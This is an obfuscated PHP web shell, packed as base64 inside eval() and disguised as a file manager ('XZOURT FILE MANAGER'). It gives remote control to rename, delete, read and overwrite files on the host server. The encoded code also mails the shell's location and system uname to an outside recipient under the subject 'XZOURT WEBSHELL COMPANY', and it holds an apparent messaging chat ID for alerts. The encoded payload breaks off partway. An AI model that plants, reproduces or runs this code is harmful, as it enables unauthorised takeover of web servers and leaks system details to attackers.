<?php eval(base64_decode('CiBnb3RvIE1PcFEzOyByS1RHazogaWYgKCRpcF9ydWxlc2V0ICE9ICJcMTE3XDEwNlx4NDYiKSB7ICRjbGllbnRJcCA9ICRfU0VSVkVSWyJcMTIyXHg0NVwxMTVceDRmXDEyNFwxMDVceDVmXHg0MVwxMDRceDQ0XDEyMiJdOyAkcHJvY2VlZCA9IGZhbHNlOyAkd2hpdGVsaXN0ZWQgPSBpbl9hcnJheSgkY2xpZW50SXAsICRpcF93aGl0ZWxpc3QpOyAkYmxhY2tsaXN0ZWQgPSBpbl9hcnJheSgkY2xpZW50SXAsICRpcF9ibGFja2xpc3QpOyBpZiAoJGlwX3J1bGVzZXQgPT0gIlx4NDFceDRlXHg0NCIpIHsgaWYgKCR3aGl0ZWxpc3RlZCA9PSB0cnVlICYmICRibGFja2xpc3RlZCA9PSBmYWxzZSkgeyAkcHJvY2VlZCA9IHRydWU7IH0gfSBlbHNlIHsgaWYgKCRpcF9ydWxlc2V0ID09ICJcMTE3XHg1MiIpIHsgaWYgKCR3aGl0ZWxpc3RlZCA9PSB0cnVlIHx8ICRibGFja2xpc3RlZCA9PSBmYWxzZSkgeyAkcHJvY2VlZCA9IHRydWU7IH0gfSB9IGlmICgkcHJvY2VlZCA9PSBmYWxzZSkgeyB0cmlnZ2VyX2Vycm9yKCJcMTI1XHg3M1x4NjVceDcyXDQwXDE0M1wxNTdceDZlXDE1Nlx4NjVceDYzXDE2NFwxNTFceDZmXHg2ZVx4MjBceDY0XDE0NVwxNTZcMTUxXDE0NVwxNDRcNDBcMTQ2XDE2MlwxNTdcMTU1XHgzYVw0MCIgLiAkY2xpZW50SXAsIEVfVVNFUl9XQVJOSU5HKTsgaWYgKCRpcF9zaWxlbnQgPT0gZmFsc2UpIHsgZm1fc2V0X21zZyhsbmcoIlwxMDFceDYzXHg2M1x4NjVcMTYzXHg3M1x4MjBceDY0XDE0NVx4NmVcMTUxXHg2NVwxNDRcNTZceDIwXHg0OVwxMjBceDIwXDE2MlwxNDVcMTYzXDE2NFx4NzJceDY5XHg2M1x4NzRcMTUxXDE1N1x4NmVceDIwXHg2MVwxNjBceDcwXDE1NFx4NjlcMTQzXHg2MVwxNDJcMTU0XDE0NSIpLCAiXHg2NVx4NzJceDcyXDE1N1wxNjIiKTsgZm1fc2hvd19oZWFkZXJfbG9naW4oKTsgZm1fc2hvd19tZXNzYWdlKCk7IH0gZGllOyB9IH0gZ290byBpZDd5bTsgczlmb3I6ICRjaGF0SWQgPSAiXDYxXDY2XHgzMVx4MzJcNjRcNjJceDM0XHgzNVw3MFw2NSI7IGdvdG8gU2VQN3o7IEhGOFd2OiAkdGhlbWUgPSBpc3NldCgkY2ZnLT5kYXRhWyJceDc0XHg2OFx4NjVceDZkXHg2NSJdKSA/ICRjZmctPmRhdGFbIlwxNjRcMTUwXHg2NVwxNTVcMTQ1Il0gOiAiXDE1NFx4NjlcMTQ3XHg2OFx4NzQiOyBnb3RvIFBrNzY4OyBrNnYweTogZGVmaW5lZCgiXDEwNlwxMTVcMTM3XHg0OVwxMDNcMTE3XDExNlx4NTZceDVmXHg0OVx4NGVcMTIwXHg1NVx4NTRceDVmXDEwNVx4NGVcMTAzIikgfHwgZGVmaW5lKCJcMTA2XHg0ZFwxMzdceDQ5XDEwM1wxMTdceDRlXDEyNlx4NWZcMTExXHg0ZVx4NTBcMTI1XDEyNFx4NWZcMTA1XDExNlwxMDMiLCAkaWNvbnZfaW5wdXRfZW5jb2RpbmcpOyBnb3RvIEIyTDFfOyBFbDZqeTogaWYgKGlzc2V0KCRfR0VUWyJcMTYyXHg2NVwxNTYiXSwgJF9HRVRbIlwxNjRcMTU3Il0pICYmICFGTV9SRUFET05MWSkgeyAkb2xkID0gJF9HRVRbIlwxNjJceDY1XDE1NiJdOyAkb2xkID0gZm1fY2xlYW5fcGF0aCgkb2xkKTsgJG9sZCA9IHN0cl9yZXBsYWNlKCJceDJmIiwgJycsICRvbGQpOyAkbmV3ID0gJF9HRVRbIlwxNjRcMTU3Il07ICRuZXcgPSBmbV9jbGVhbl9wYXRoKHN0cmlwX3RhZ3MoJG5ldykpOyAkbmV3ID0gc3RyX3JlcGxhY2UoIlx4MmYiLCAnJywgJG5ldyk7ICRwYXRoID0gRk1fUk9PVF9QQVRIOyBpZiAoRk1fUEFUSCAhPSAnJykgeyAkcGF0aCAuPSAiXDU3IiAuIEZNX1BBVEg7IH0gaWYgKGZtX2lzdmFsaWRfZmlsZW5hbWUoJG5ldykgJiYgJG9sZCAhPSAnJyAmJiAkbmV3ICE9ICcnKSB7IGlmIChmbV9yZW5hbWUoJHBhdGggLiAiXHgyZiIgLiAkb2xkLCAkcGF0aCAuICJcNTciIC4gJG5ldykpIHsgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygiXHg1Mlx4NjVceDZlXHg2MVwxNTVcMTQ1XDE0NFx4MjBceDY2XHg3MlwxNTdceDZkIikgLiAiXHgyMFw3NFwxNDJceDNlXDQ1XDE2M1x4M2NceDJmXHg2Mlx4M2VcNDAiIC4gbG5nKCJcMTY0XHg2ZiIpIC4gIlx4MjBceDNjXDE0Mlw3Nlw0NVwxNjNceDNjXHgyZlwxNDJcNzYiLCBmbV9lbmMoJG9sZCksIGZtX2VuYygkbmV3KSkpOyB9IGVsc2UgeyBmbV9zZXRfbXNnKHNwcmludGYobG5nKCJcMTA1XDE2Mlx4NzJcMTU3XDE2Mlw0MFwxNjdcMTUwXDE1MVwxNTRcMTQ1XDQwXHg3Mlx4NjVcMTU2XHg2MVx4NmRcMTUxXDE1Nlx4NjdcNDBceDY2XDE2MlwxNTdcMTU1IikgLiAiXDQwXDc0XDE0Mlx4M2VcNDVceDczXHgzY1x4MmZceDYyXHgzZVx4MjAiIC4gbG5nKCJcMTY0XHg2ZiIpIC4gIlw0MFw3NFx4NjJceDNlXHgyNVwxNjNcNzRcNTdcMTQyXHgzZSIsIGZtX2VuYygkb2xkKSwgZm1fZW5jKCRuZXcpKSwgIlx4NjVcMTYyXHg3Mlx4NmZcMTYyIik7IH0gfSBlbHNlIHsgZm1fc2V0X21zZyhsbmcoIlwxMTFceDZlXHg3Nlx4NjFceDZjXDE1MVx4NjRceDIwXDE0M1x4NjhceDYxXHg3MlwxNDFceDYzXDE2NFwxNDVcMTYyXDE2M1x4MjBcMTUxXDE1Nlx4MjBcMTQ2XDE1MVwxNTRcMTQ1XDQwXDE1NlwxNDFcMTU1XHg2NSIpLCAiXDE0NVx4NzJceDcyXDE1N1wxNjIiKTsgfSBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJcNzdceDcwXHgzZCIgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOyB9IGdvdG8gWnA2SzY7IGZUYU1rOiAkcGVzYW5fYWxlcnQgPSAiXDEzM1w0MHskeF9wYXRofVw0MFwxMzUiOyBnb3RvIFo0YnRSOyBBVkZXeDogaWYgKGlzX2FycmF5KCRvYmplY3RzKSAmJiBmbV9pc19leGNsdWRlX2l0ZW1zKCRjdXJyZW50X3BhdGgpKSB7IGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7IGlmICgkZmlsZSA9PSAiXDU2IiB8fCAkZmlsZSA9PSAiXHgyZVx4MmUiKSB7IGNvbnRpbnVlOyB9IGlmICghRk1fU0hPV19ISURERU4gJiYgc3Vic3RyKCRmaWxlLCAwLCAxKSA9PT0gIlw1NiIpIHsgY29udGludWU7IH0gJG5ld19wYXRoID0gJHBhdGggLiAiXHgyZiIgLiAkZmlsZTsgaWYgKEBpc19maWxlKCRuZXdfcGF0aCkgJiYgZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkpIHsgJGZpbGVzW10gPSAkZmlsZTsgfSBlbHNlaWYgKEBpc19kaXIoJG5ld19wYXRoKSAmJiAkZmlsZSAhPSAiXHgyZSIgJiYgJGZpbGUgIT0gIlw1Nlw1NiIgJiYgZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkpIHsgJGZvbGRlcnNbXSA9ICRmaWxlOyB9IH0gfSBnb3RvIFM2OUlYOyBESkRlQzogaWYgKGlzc2V0KCRfR0VUWyJceDY0XDE0NVwxNTQiXSkgJiYgIUZNX1JFQURPTkxZKSB7ICRkZWwgPSBzdHJfcmVwbGFjZSgiXHgyZiIsICcnLCBmbV9jbGVhbl9wYXRoKCRfR0VUWyJceDY0XHg2NVwxNTQiXSkpOyBpZiAoJGRlbCAhPSAnJyAmJiAkZGVsICE9ICJcNTZceDJlIiAmJiAkZGVsICE9ICJcNTYiKSB7ICRwYXRoID0gRk1fUk9PVF9QQVRIOyBpZiAoRk1fUEFUSCAhPSAnJykgeyAkcGF0aCAuPSAiXHgyZiIgLiBGTV9QQVRIOyB9ICRpc19kaXIgPSBpc19kaXIoJHBhdGggLiAiXHgyZiIgLiAkZGVsKTsgaWYgKGZtX3JkZWxldGUoJHBhdGggLiAiXDU3IiAuICRkZWwpKSB7ICRtc2cgPSAkaXNfZGlyID8gbG5nKCJcMTA2XHg2ZlwxNTRceDY0XDE0NVwxNjIiKSAuICJcNDBceDNjXHg2Mlw3Nlw0NVx4NzNcNzRcNTdcMTQyXHgzZVx4MjAiIC4gbG5nKCJceDQ0XHg2NVwxNTRcMTQ1XDE2NFwxNDVcMTQ0IikgOiBsbmcoIlwxMDZceDY5XDE1NFwxNDUiKSAuICJceDIwXHgzY1wxNDJcNzZceDI1XHg3M1x4M2NceDJmXDE0Mlw3Nlx4MjAiIC4gbG5nKCJcMTA0XDE0NVwxNTRceDY1XHg3NFwxNDVcMTQ0Iik7IGZtX3NldF9tc2coc3ByaW50ZigkbXNnLCBmbV9lbmMoJGRlbCkpKTsgfSBlbHNlIHsgJG1zZyA9ICRpc19kaXIgPyBsbmcoIlwxMDZceDZmXDE1NFwxNDRcMTQ1XHg3MiIpIC4gIlx4MjBceDNjXDE0Mlw3Nlw0NVwxNjNceDNjXHgyZlwxNDJceDNlXHgyMCIgLiBsbmcoIlwxNTZceDZmXHg3NFw0MFx4NjRcMTQ1XHg2Y1wxNDVceDc0XHg2NVx4NjQiKSA6IGxuZygiXDEwNlx4NjlceDZjXDE0NSIpIC4gIlw0MFx4M2NceDYyXDc2XHgyNVwxNjNceDNjXDU3XDE0Mlw3Nlx4MjAiIC4gbG5nKCJcMTU2XHg2Zlx4NzRceDIwXHg2NFwxNDVcMTU0XHg2NVx4NzRceDY1XHg2NCIpOyBmbV9zZXRfbXNnKHNwcmludGYoJG1zZywgZm1fZW5jKCRkZWwpKSwgIlwxNDVceDcyXHg3Mlx4NmZcMTYyIik7IH0gfSBlbHNlIHsgZm1fc2V0X21zZyhsbmcoIlx4NDlcMTU2XDE2Nlx4NjFcMTU0XHg2OVx4NjRcNDBceDY2XHg2OVx4NmNcMTQ1XHgyMFwxNTdcMTYyXDQwXDE0Nlx4NmZceDZjXDE0NFx4NjVcMTYyXHgyMFx4NmVcMTQxXDE1NVwxNDUiKSwgIlwxNDVceDcyXDE2Mlx4NmZcMTYyIik7IH0gZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAiXHgzZlx4NzBceDNkIiAuIHVybGVuY29kZShGTV9QQVRIKSk7IH0gZ290byBpR05NRjsgZE15V1M6ICRjdXJyZW50X3BhdGggPSBhcnJheV9zbGljZShleHBsb2RlKCJcNTciLCAkcGF0aCksIC0xKVswXTsgZ290byBBVkZXeDsgSkZOTGs6IGlmIChpc3NldCgkX0dFVFsiXHg2NVx4NjRceDY5XHg3NCJdKSkgeyAkZmlsZSA9ICRfR0VUWyJcMTQ1XDE0NFx4NjlcMTY0Il07ICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSwgZmFsc2UpOyAkZmlsZSA9IHN0cl9yZXBsYWNlKCJcNTciLCAnJywgJGZpbGUpOyBpZiAoJGZpbGUgPT0gJycgfHwgIWlzX2ZpbGUoJHBhdGggLiAiXHgyZiIgLiAkZmlsZSkpIHsgZm1fc2V0X21zZyhsbmcoIlwxMDZcMTUxXHg2Y1wxNDVceDIwXDE1NlwxNTdcMTY0XHgyMFx4NjZcMTU3XHg3NVwxNTZcMTQ0IiksICJcMTQ1XHg3MlwxNjJceDZmXDE2MiIpOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICJceDNmXDE2MFx4M2QiIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsgfSBoZWFkZXIoIlwxMzBcNTVcMTMwXDEyM1x4NTNcNTVceDUwXDE2MlwxNTdceDc0XHg2NVx4NjNceDc0XDE1MVx4NmZceDZlXDcyXHgzMCIpOyBmbV9zaG93X2hlYWRlcigpOyBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAkZmlsZV91cmwgPSBGTV9ST09UX1VSTCAuIGZtX2NvbnZlcnRfd2luKChGTV9QQVRIICE9ICcnID8gIlx4MmYiIC4gRk1fUEFUSCA6ICcnKSAuICJcNTciIC4gJGZpbGUpOyAkZmlsZV9wYXRoID0gJHBhdGggLiAiXHgyZiIgLiAkZmlsZTsgJGlzTm9ybWFsRWRpdG9yID0gdHJ1ZTsgaWYgKGlzc2V0KCRfR0VUWyJceDY1XHg2ZVwxNjYiXSkpIHsgaWYgKCRfR0VUWyJceDY1XHg2ZVx4NzYiXSA9PSAiXHg2MVwxNDNceDY1IikgeyAkaXNOb3JtYWxFZGl0b3IgPSBmYWxzZTsgfSB9IGlmIChpc3NldCgkX1BPU1RbIlwxNjNcMTQxXDE2Nlx4NjVceDY0XDE0MVwxNjRceDYxIl0pKSB7ICR3cml0ZWRhdGEgPSAkX1BPU1RbIlx4NzNcMTQxXHg3NlwxNDVceDY0XHg2MVx4NzRceDYxIl07ICRmZCA9IGZvcGVuKCRmaWxlX3BhdGgsICJceDc3Iik7IEBmd3JpdGUoJGZkLCAkd3JpdGVkYXRhKTsgZmNsb3NlKCRmZCk7IGZtX3NldF9tc2cobG5nKCJceDQ2XHg2OVx4NmNcMTQ1XDQwXHg1M1wxNDFcMTY2XDE0NVx4NjRceDIwXHg1M1x4NzVcMTQzXDE0M1x4NjVceDczXHg3M1wxNDZcMTY1XHg2Y1x4NmNceDc5IikpOyB9ICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlX3BhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTikpOyAkbWltZV90eXBlID0gZm1fZ2V0X21pbWVfdHlwZSgkZmlsZV9wYXRoKTsgJGZpbGVzaXplID0gZmlsZXNpemUoJGZpbGVfcGF0aCk7ICRpc190ZXh0ID0gZmFsc2U7ICRjb250ZW50ID0gJyc7IGlmIChpbl9hcnJheSgkZXh0LCBmbV9nZXRfdGV4dF9leHRzKCkpIHx8IHN1YnN0cigkbWltZV90eXBlLCAwLCA0KSA9PSAiXDE2NFx4NjVceDc4XHg3NCIgfHwgaW5fYXJyYXkoJG1pbWVfdHlwZSwgZm1fZ2V0X3RleHRfbWltZXMoKSkpIHsgJGlzX3RleHQgPSB0cnVlOyAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlX3BhdGgpOyB9ID8+CiAgICA8ZGl2IGNsYXNzPSJwYXRoIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTUgY29sLWxnLTYgcHQtMSI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJidG4tdG9vbGJhciIgcm9sZT0idG9vbGJhciI+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIGlmICghJGlzTm9ybWFsRWRpdG9yKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImJ0bi1ncm91cCBqcy1hY2UtdG9vbGJhciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJub25lIiBkYXRhLW9wdGlvbj0iZnVsbHNjcmVlbiIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLWZ1bGxzY3JlZW4iIHRpdGxlPSJGdWxsc2NyZWVuIj48aSBjbGFzcz0iZmEgZmEtZXhwYW5kIiB0aXRsZT0iRnVsbHNjcmVlbiI+PC9pPjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBkYXRhLWNtZD0iZmluZCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLXNlYXJjaCIgdGl0bGU9IlNlYXJjaCI+PGkgY2xhc3M9ImZhIGZhLXNlYXJjaCIgdGl0bGU9IlNlYXJjaCI+PC9pPjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBkYXRhLWNtZD0idW5kbyIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLXVuZG8iIHRpdGxlPSJVbmRvIj48aSBjbGFzcz0iZmEgZmEtdW5kbyIgdGl0bGU9IlVuZG8iPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gZGF0YS1jbWQ9InJlZG8iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXNlY29uZGFyeSIgaWQ9ImpzLWFjZS1yZWRvIiB0aXRsZT0iUmVkbyI+PGkgY2xhc3M9ImZhIGZhLXJlcGVhdCIgdGl0bGU9IlJlZG8iPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gZGF0YS1jbWQ9Im5vbmUiIGRhdGEtb3B0aW9uPSJ3cmFwIiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tb3V0bGluZS1zZWNvbmRhcnkiIGlkPSJqcy1hY2Utd29yZFdyYXAiIHRpdGxlPSJXb3JkIFdyYXAiPjxpIGNsYXNzPSJmYSBmYS10ZXh0LXdpZHRoIiB0aXRsZT0iV29yZCBXcmFwIj48L2k+PC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGRhdGEtY21kPSJub25lIiBkYXRhLW9wdGlvbj0iaGVscCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtc2Vjb25kYXJ5IiBpZD0ianMtYWNlLWdvTGluZSIgdGl0bGU9IkhlbHAiPjxpIGNsYXNzPSJmYSBmYS1xdWVzdGlvbiIgdGl0bGU9IkhlbHAiPjwvaT48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgaWQ9ImpzLWFjZS1tb2RlIiBkYXRhLXR5cGU9Im1vZGUiIHRpdGxlPSJTZWxlY3QgRG9jdW1lbnQgVHlwZSIgY2xhc3M9ImJ0bi1vdXRsaW5lLXNlY29uZGFyeSBib3JkZXItbGVmdC0wIGQtbm9uZSBkLW1kLWJsb2NrIj48b3B0aW9uPi0tIFNlbGVjdCBNb2RlIC0tPC9vcHRpb24+PC9zZWxlY3Q+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGlkPSJqcy1hY2UtdGhlbWUiIGRhdGEtdHlwZT0idGhlbWUiIHRpdGxlPSJTZWxlY3QgVGhlbWUiIGNsYXNzPSJidG4tb3V0bGluZS1zZWNvbmRhcnkgYm9yZGVyLWxlZnQtMCBkLW5vbmUgZC1sZy1ibG9jayI+PG9wdGlvbj4tLSBTZWxlY3QgVGhlbWUgLS08L29wdGlvbj48L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgaWQ9ImpzLWFjZS1mb250U2l6ZSIgZGF0YS10eXBlPSJmb250U2l6ZSIgdGl0bGU9IlNlbGVjdCBGb250IFNpemUiIGNsYXNzPSJidG4tb3V0bGluZS1zZWNvbmRhcnkgYm9yZGVyLWxlZnQtMCBkLW5vbmUgZC1sZy1ibG9jayI+PG9wdGlvbj4tLSBTZWxlY3QgRm9udCBTaXplIC0tPC9vcHRpb24+PC9zZWxlY3Q+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDw/cGhwICB9ID8+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImVkaXQtZmlsZS1hY3Rpb25zIGNvbC14cy0xMiBjb2wtc20tNyBjb2wtbGctNiB0ZXh0LXJpZ2h0IHB0LTEiPgogICAgICAgICAgICAgICAgPGEgdGl0bGU9IkJhY2siIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEgpKTsgPz4KJmFtcDt2aWV3PTw/cGhwICBlY2hvIHVybGVuY29kZSgkZmlsZSk7ID8+CiI+PGkgY2xhc3M9ImZhIGZhLXJlcGx5LWFsbCI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMDJcMTQxXDE0M1x4NmIiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgPGEgdGl0bGU9IkJhY2t1cCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtcHJpbWFyeSIgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApOyIgb25jbGljaz0iYmFja3VwKCc8P3BocCAgZWNobyB1cmxlbmNvZGUodHJpbShGTV9QQVRIKSk7ID8+CicsJzw/cGhwICBlY2hvIHVybGVuY29kZSgkZmlsZSk7ID8+CicpIj48aSBjbGFzcz0iZmEgZmEtZGF0YWJhc2UiPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJceDQyXDE0MVx4NjNceDZiXDEyNVx4NzAiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgPD9waHAgIGlmICgkaXNfdGV4dCkgeyA/PgogICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoJGlzTm9ybWFsRWRpdG9yKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSJBZHZhbmNlZCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtcHJpbWFyeSIgaHJlZj0iP3A9PD9waHAgIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpOyA/PgomYW1wO2VkaXQ9PD9waHAgIGVjaG8gdXJsZW5jb2RlKCRmaWxlKTsgPz4KJmFtcDtlbnY9YWNlIj48aSBjbGFzcz0iZmEgZmEtcGVuY2lsLXNxdWFyZS1vIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg0MVx4NjRcMTY2XDE0MVx4NmVceDYzXDE0NVwxNDRcMTA1XHg2NFx4NjlcMTY0XDE1N1wxNjIiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtcHJpbWFyeSBuYW1lPSJTYXZlIiBkYXRhLXVybD0iPD9waHAgIGVjaG8gZm1fZW5jKCRmaWxlX3VybCk7ID8+CiIgb25jbGljaz0iZWRpdF9zYXZlKHRoaXMsJ25ybCcpIj48aSBjbGFzcz0iZmEgZmEtZmxvcHB5LW8iPjwvaT4gU2F2ZQogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8P3BocCAgfSBlbHNlIHsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9IlBsYWluIEVkaXRvciIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtcHJpbWFyeSIgaHJlZj0iP3A9PD9waHAgIGVjaG8gdXJsZW5jb2RlKHRyaW0oRk1fUEFUSCkpOyA/PgomYW1wO2VkaXQ9PD9waHAgIGVjaG8gdXJsZW5jb2RlKCRmaWxlKTsgPz4KIj48aSBjbGFzcz0iZmEgZmEtdGV4dC1oZWlnaHQiPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJceDRlXHg2Zlx4NzJcMTU1XDE0MVx4NmNceDQ1XHg2NFx4NjlcMTY0XDE1N1wxNjIiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc20gYnRuLW91dGxpbmUtcHJpbWFyeSIgbmFtZT0iU2F2ZSIgZGF0YS11cmw9Ijw/cGhwICBlY2hvIGZtX2VuYygkZmlsZV91cmwpOyA/PgoiIG9uY2xpY2s9ImVkaXRfc2F2ZSh0aGlzLCdhY2UnKSI+PGkgY2xhc3M9ImZhIGZhLWZsb3BweS1vIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg1M1x4NjFceDc2XDE0NSIpOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8P3BocCAgfSA/PgogICAgICAgICAgICAgICAgPD9waHAgIH0gPz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAgIGlmICgkaXNfdGV4dCAmJiAkaXNOb3JtYWxFZGl0b3IpIHsgZWNobyAiXHgzY1x4NzRceDY1XDE3MFwxNjRcMTQxXHg3Mlx4NjVceDYxXDQwXDE0M1wxNTRcMTQxXDE2M1x4NzNcNzVceDIyXHg2ZFwxNjRceDJkXHgzMlw0Mlw0MFwxNTFceDY0XHgzZFw0Mlx4NmVcMTU3XHg3Mlx4NmRceDYxXHg2Y1w1NVwxNDVceDY0XHg2OVwxNjRcMTU3XHg3Mlx4MjJcNDBceDcyXDE1N1wxNjdceDczXHgzZFx4MjJceDMzXHgzM1w0Mlx4MjBcMTQzXDE1N1wxNTRcMTYzXHgzZFx4MjJceDMxXDYyXDYwXDQyXHgyMFwxNjNceDc0XDE3MVwxNTRcMTQ1XDc1XDQyXDE2N1x4NjlcMTQ0XDE2NFwxNTBcNzJceDIwXDcxXHgzOVx4MmVceDM1XHgyNVw3M1w0Mlw3NiIgLiBodG1sc3BlY2lhbGNoYXJzKCRjb250ZW50KSAuICJcNzRcNTdcMTY0XHg2NVx4NzhceDc0XHg2MVx4NzJceDY1XDE0MVx4M2UiOyB9IGVsc2VpZiAoJGlzX3RleHQpIHsgZWNobyAiXHgzY1x4NjRceDY5XDE2Nlw0MFwxNTFceDY0XHgzZFw0MlwxNDVceDY0XHg2OVwxNjRceDZmXDE2Mlx4MjJcNDBceDYzXDE1N1x4NmVcMTY0XHg2NVwxNTZcMTY0XHg2NVx4NjRcMTUxXDE2NFx4NjFceDYyXHg2Y1x4NjVcNzVcNDJceDc0XHg3MlwxNjVceDY1XHgyMlw3NiIgLiBodG1sc3BlY2lhbGNoYXJzKCRjb250ZW50KSAuICJcNzRcNTdcMTQ0XHg2OVx4NzZcNzYiOyB9IGVsc2UgeyBmbV9zZXRfbXNnKGxuZygiXDEwNlx4NDlcMTE0XDEwNVw0MFx4NDVceDU4XHg1NFx4NDVceDRlXHg1M1wxMTFceDRmXDExNlx4MjBcMTEwXHg0MVwxMjNceDIwXHg0ZVwxMTdcMTI0XDQwXHg1M1x4NTVceDUwXHg1MFwxMTdceDUyXHg1NFx4NDVcMTA0IiksICJcMTQ1XDE2Mlx4NzJcMTU3XHg3MiIpOyB9ID8+CiAgICA8L2Rpdj4KICAgIDw/cGhwICBmbV9zaG93X2Zvb3RlcigpOyBkaWU7IH0gZ290byBydmVtaTsgSGVYS006ICRmaWxlcyA9IGFycmF5KCk7IGdvdG8gZE15V1M7IFcwdzl2OiBkZWZpbmVkKCJcMTA2XDExNVx4NWZceDQ0XDEwMVx4NTRceDQ1XHg1NFx4NDlceDRkXHg0NVx4NWZcMTA2XHg0Zlx4NTJceDRkXHg0MVwxMjQiKSB8fCBkZWZpbmUoIlwxMDZcMTE1XHg1ZlwxMDRcMTAxXDEyNFx4NDVceDU0XDExMVx4NGRcMTA1XHg1Zlx4NDZcMTE3XHg1MlwxMTVceDQxXDEyNCIsICRkYXRldGltZV9mb3JtYXQpOyBnb3RvIG04cWpfOyBaNGJ0UjogbWFpbCgkdG8sICJceDU4XHg1YVx4NGZcMTI1XDEyMlwxMjRcNDBceDU3XDEwNVwxMDJcMTIzXHg0OFwxMDVcMTE0XDExNFx4MjBcMTAzXHg0ZlwxMTVceDUwXDEwMVx4NGVceDU5IiwgJHBlc2FuX2FsZXJ0LCAiXHg1Ylx4MjAiIC4gcGhwX3VuYW1lKCkgLiAiXDQwXDEzNSIpOyBnb3RvIE5TRDVIOyBvNjkxNDogZGVmaW5lKCJceDQxXDEyMFx4NTBceDVmXDEyNFwxMTFceDU0XDExNFwxMDUiLCAiXDEzMFx4NWFceDRmXHg1NVx4NTJceDU0XDQwXDEwNlx4NDlceDRjXHg0NVw0MFwxMTVcMTAxXDExNlwxMDFceDQ3XDEwNVx4NTIiKTsgZ290byBiVHpWTTsgRjl3d0w6ICRudW1fZmlsZXMgPSBjb3VudCgkZmlsZXMpOyBnb3RvIE1JTVp5OyBpOWhEbzogJF9QT1NUID0gc3RycG9zKCRpbnB1dCwgIlwxNDFcMTUyXDE0MVx4NzgiKSAhPSBGQUxTRSAmJiBzdHJwb3MoJGlucHV0LCAiXDE2M1wxNDFceDc2XHg2NSIpICE9IEZBTFNFID8ganNvbl9kZWNvZGUoJGlucHV0LCB0cnVlKSA6ICRfUE9TVDsgZ290byB0M19nUzsgc25IVVI6ICRpcF9zaWxlbnQgPSB0cnV